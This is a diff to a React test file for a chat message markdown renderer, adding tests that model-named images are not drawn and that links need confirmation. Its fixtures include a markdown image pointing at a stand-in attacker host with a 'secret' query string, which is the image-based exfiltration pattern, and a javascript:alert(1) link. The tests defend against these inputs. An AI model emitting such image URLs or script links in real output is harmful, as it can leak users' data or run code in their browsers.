@@ -1,5 +1,6 @@
 import { render } from "@testing-library/react";
 import { describe, expect, it } from "vitest";
+import { defaultRehypePlugins } from "streamdown";
 import { MessageMarkdown } from "./markdown.js";
 
 const root = (container: HTMLElement, slot = "message-markdown") =>
@@ -30,7 +31,7 @@ describe("MessageMarkdown", () => {
   });
 
   /**
-   * The whole reason the subpath exists. Mid-stream `**bo` is not bold yet, and a parser that
+   * The whole reason this is not `MessageText`. Mid-stream `**bo` is not bold yet, and a parser that
    * renders it honestly flickers literal asterisks into place as the answer completes.
    */
   it("closes an unterminated emphasis while streaming, and leaves it alone when static", () => {
@@ -43,5 +44,29 @@ describe("MessageMarkdown", () => {
 
     rerender(<MessageMarkdown>{"It is **gra"}</MessageMarkdown>);
     expect(root(container)?.textContent).toBe("It is **gra");
+  });
+
+  it("draws no image a model names, remote or inline, and keeps its alt text readable", () => {
+    const { container } = render(
+      <MessageMarkdown>{"![x](https://evil.example/p.png?q=secret)\n\n![y](data:image/png;base64,AAAA)\n\n<img src=\"https://evil.example/raw.png\">"}</MessageMarkdown>,
+    );
+    expect(container.querySelector("img")).toBeNull();
+  });
+
+  it("opens a link only after the reader confirms, and never a javascript: one", () => {
+    const { container } = render(
+      <MessageMarkdown>{"[a](https://ok.example/) [b](mailto:a@ok.example) [c](javascript:alert(1))"}</MessageMarkdown>,
+    );
+    // Link safety turns each allowed link into a button that asks first; none is an anchor to follow.
+    expect([...container.querySelectorAll("button[data-streamdown=link]")].map((b) => b.textContent)).toEqual(["a", "b"]);
+    expect(container.querySelector("a")).toBeNull();
+    expect(container.textContent).toContain("c [blocked]");
+  });
+
+  it("lets a host reopen images with Streamdown's own rehypePlugins", () => {
+    const { container } = render(
+      <MessageMarkdown rehypePlugins={Object.values(defaultRehypePlugins)}>{"![x](https://ok.example/p.png)"}</MessageMarkdown>,
+    );
+    expect(container.querySelector("img")).not.toBeNull();
   });
 });
